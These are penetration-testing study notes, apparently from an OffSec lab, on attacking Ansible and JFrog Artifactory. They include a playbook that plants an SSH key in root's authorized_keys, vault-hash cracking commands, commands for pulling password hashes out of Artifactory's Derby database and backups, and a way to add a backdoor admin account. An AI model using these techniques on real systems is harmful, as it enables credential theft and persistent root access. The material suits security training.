<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Devops</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Devops</h1><br/><p><h2>Ansible Intro</h2></p><p><ul><li><small>Ansible is an infrastructure configuration engine that enables IT personnel to dynamically and automatically configure IT infrastructure and computing resources. It works through a “push” model where the Ansible controller connects to registered “nodes” and runs “modules” on them</small></li><li><small>/etc/ansible/hosts on the controller server contains all the nodes</small></li><li><small>For actions to be performed on the node, either the password for a user on the node needs to be stored on the controller, or the controller’s Ansible account needs to be configured on the node</small></li></ul><small></small></p><p><small>using SSH keys. This allows the controller to connect to the node via SSH or other means and run the desired modules.</small><ul><li><small>the user configured by Ansible typically has root or sudo-level permissions.</small></li><li><small>Because of this, compromising the Ansible server or getting the private key for an Ansible configuration account could allow complete compromise of any nodes in the Ansible controller’s inventory.</small></li></ul></p><p><h2>Recon</h2><ul><li>ansible a</li></ul></p><p><h2>Exploit ansible1 : credentials</h2> <ul><li>gather credentials (e.g lab password of offsec user)</li><li></li></ul><div class="codebox"><pre>--<br />- <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">Write a file as offsec</span><br />    <span style="color:#ff9d00;font-weight:700">hosts</span>: <span style="color:#3ad900;font-weight:400">all</span><br />    <span style="color:#ff9d00;font-weight:700">gather_facts</span>: <span style="color:#ff0044;font-weight:400">true</span><br />    <span style="color:#ff9d00;font-weight:700">become</span>: <span style="color:#3ad900;font-weight:400">yes</span><br />    <span style="color:#ff9d00;font-weight:700">become_user</span>: <span style="color:#3ad900;font-weight:400">offsec</span><br />    <span style="color:#ff9d00;font-weight:700">vars</span>:<br />      <span style="color:#ff9d00;font-weight:700">ansible_become_pass</span>: <span style="color:#3ad900;font-weight:400">lab</span><br />    <span style="color:#ff9d00;font-weight:700">tasks</span>:<br />      - <span style="color:#ff9d00;font-weight:700">copy</span>:<br />        <span style="color:#ff9d00;font-weight:700">content</span>: <span style="color:#3ad900;font-weight:400">&quot;This is my offsec content&quot;</span><br />        <span style="color:#ff9d00;font-weight:700">dest</span>: <span style="color:#3ad900;font-weight:400">&quot;/home/offsec/written_by_ansible.txt&quot;</span><br />        <span style="color:#ff9d00;font-weight:700">mode</span>: <span style="color:#3ad900;font-weight:400">0644</span><br />        <span style="color:#ff9d00;font-weight:700">owner</span>: <span style="color:#3ad900;font-weight:400">offsec</span><br />        <span style="color:#ff9d00;font-weight:700">group</span>: <span style="color:#3ad900;font-weight:400">offsec</span><br /></pre></div><ul><li>crack ansible vault passwords $ANSIBLE_VAULT<ul><li>ansible2john.py ./test.yml</li><li></li></ul></li></ul><img src="images/27-1.png" alt="images/27-1.png" /><ul><li>hashcat testhash.txt --force --hash-type=16900</li><li>ansible-playbook test.yml //run the playbook </li></ul></p><p><ul><li>sometimes some modules will leak extyra information on the system like shell module for /var/log/syslog <ul><li>e.g connect to db </li></ul></li><li></li></ul><img src="images/27-2.png" alt="images/27-2.png" /></p><p></p><p><h2>Exploit ansible 2 : weak permissions on ansible playbooks</h2></p><p></p><p><ul><li>POst exploit</li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">---</span><br />- <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">Get system info</span><br />	<span style="color:#ff9d00;font-weight:700">hosts</span>: <span style="color:#3ad900;font-weight:400">all</span><br />	<span style="color:#ff9d00;font-weight:700">gather_facts</span>: <span style="color:#ff0044;font-weight:400">true</span><br />	<span style="color:#ff9d00;font-weight:700">become</span>: <span style="color:#3ad900;font-weight:400">yes</span><br />	<span style="color:#ff9d00;font-weight:700">tasks</span>:<br />		- <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">Display info</span><br />		<span style="color:#ff9d00;font-weight:700">debug</span>:<br />			<span style="color:#ff9d00;font-weight:700">msg</span>: <span style="color:#3ad900;font-weight:400">&quot;The hostname is {{ ansible_hostname }} and the OS is {{ansible_distribution }}&quot;</span><br />		- <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">Create a directory if it does not exist</span><br />		<span style="color:#ff9d00;font-weight:700">file</span>:<br />			<span style="color:#ff9d00;font-weight:700">path</span>: <span style="color:#3ad900;font-weight:400">/root/.ssh</span><br />			<span style="color:#ff9d00;font-weight:700">state</span>: <span style="color:#3ad900;font-weight:400">directory</span><br />			<span style="color:#ff9d00;font-weight:700">mode</span>: <span style="color:#3ad900;font-weight:400">&#39;0700&#39;</span><br />			<span style="color:#ff9d00;font-weight:700">owner</span>: <span style="color:#3ad900;font-weight:400">root</span><br />			<span style="color:#ff9d00;font-weight:700">group</span>: <span style="color:#3ad900;font-weight:400">root</span><br />		- <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">Create authorized keys if it does not exist</span><br />		<span style="color:#ff9d00;font-weight:700">file</span>:<br />			<span style="color:#ff9d00;font-weight:700">path</span>: <span style="color:#3ad900;font-weight:400">/root/.ssh/authorized_keys</span><br />			<span style="color:#ff9d00;font-weight:700">state</span>: <span style="color:#3ad900;font-weight:400">touch</span><br />			<span style="color:#ff9d00;font-weight:700">mode</span>: <span style="color:#3ad900;font-weight:400">&#39;0600&#39;</span><br />			<span style="color:#ff9d00;font-weight:700">owner</span>: <span style="color:#3ad900;font-weight:400">root</span><br />			<span style="color:#ff9d00;font-weight:700">group</span>: <span style="color:#3ad900;font-weight:400">root</span><br />		- <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">Update keys</span><br />			<span style="color:#ff9d00;font-weight:700">lineinfile</span>:<br />				<span style="color:#ff9d00;font-weight:700">path</span>: <span style="color:#3ad900;font-weight:400">/root/.ssh/authorized_keys</span><br />				<span style="color:#ff9d00;font-weight:700">line</span>: <span style="color:#3ad900;font-weight:400">&quot;ssh-rsa AAAAB3NzaC1...Z86SOm...&quot;</span><br />				<span style="color:#ff9d00;font-weight:700">insertbefore</span>: <span style="color:#3ad900;font-weight:400">EOF</span></pre></div></p><p></p><p><h2>Exploit ansible ad-hoc commands</h2><ul><li>• <small>• ansible $ansiblegroup -a &quot;whoami&quot; --become</small><ul><li><small>// become for root action</small></li><li><small>//f we can gain privileges to run ad-hoc commands from the Ansible controller, we have backdoor root access to run commands on any of the hosts in the inventory file</small></li></ul></li></ul><small></small></p><p><small></small></p><p><h2>Jfrog artifactory Introduction</h2><ul><li> <small> binary repository manager that stores and other binaries </small></li><li><small>Binary repository managers act as a “single source of truth” for organizations to be able to control which versions of packages and applications are being used in software development or infrastructure configuration. This prevents developers from getting untrusted or unstable binaries directly from the Internet.</small></li><li><small>Risks</small><ul><li><small>users with write access to artifactory can place packages or binaries </small></li></ul></li><li><small>/opt/jfrog </small></li><li><a href="http://controller:8082">http://controller:8082</a></li></ul></p><p></p><p><h2>JFROG defenses</h2><ul><li>• <small>• having root on the machine doesn&#39;t mean root on app (own authentication)</small></li><li><small>files are hashed </small><ul><li></li></ul></li></ul><img src="images/27-3.png" alt="images/27-3.png" /><ul><li>• <small>• even if we replace the binary on the filesystem it will not be replaced on the application because of integrity testing </small></li></ul></p><p><h2>JFROG exploit 1: backups exploit</h2><ul><li>Context : we have root on file system</li><li>The open-source version of Artifactory creates database backups for the user accounts at /&lt;ARTIFACTORY FOLDER&gt;/var/backup/access in JSON format<ul><li>/opt/jfrog/artifactory/var/backup/access</li><li>cat access.backup.20200730120454.json</li><li></li></ul></li></ul><img src="images/27-4.png" alt="images/27-4.png" /><ul><li>passwords in bcrypt format</li></ul></p><p>  </p><p></p><p><h2>JFROG exploit 2 Compromising Artifactory’s Database</h2><ul><li>if no backups are present</li><li>cp the derby databases </li><li>extract hashes manually</li><li></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">mkdir</span> /tmp/hackeddb<br /><span style="color:#ff9d00;font-weight:700">sudo</span> cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb<br /><span style="color:#ff9d00;font-weight:700">sudo</span> chmod 755 /tmp/hackeddb/derby<br /><span style="color:#0088ff;font-weight:400">## remove lock files used </span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> rm /tmp/hackeddb/derby/*.lck<br /><br /><span style="color:#0088ff;font-weight:400">## connect to db via tools (normaly they will be present on env)</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij<br /><br />ij<span style="color:#ff9d00;font-weight:700">&gt;</span> connect <span style="color:#3ad900;font-weight:400">&#39;jdbc:derby:/tmp/hackeddb/derby&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br />ij<span style="color:#ff9d00;font-weight:700">&gt;</span> select * from access_users<span style="color:#ff9d00;font-weight:700">;</span></pre></div></p><p></p><p></p><p></p><p><h2>JFROG exploit 3: Adding a Secondary Artifactory Admin Account</h2><ul><li>requires to restart the process</li><li>option initially to recover from lost password</li></ul></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sudo</span> echo <span style="color:#3ad900;font-weight:400">&quot;user@*=password123&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> /opt/jfrog/artifactory/var/etc/access/bootstrrap.creds <br /><span style="color:#0088ff;font-weight:400">## this will create a user with name user and password password123</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds<br /><span style="color:#0088ff;font-weight:400">## restart the service</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> /opt/jfrog/artifactory/app/bin/artifactoryctl stop<br /><span style="color:#ff9d00;font-weight:700">sudo</span> /opt/jfrog/artifactory/app/bin/artifactoryctl start<br /><span style="color:#0088ff;font-weight:400">## check new user was created</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> grep <span style="color:#3ad900;font-weight:400">&quot;Create admin user&quot;</span> /opt/jfrog/artifactory/var/log/console.log</pre></div></p></div>
</body>
</html>
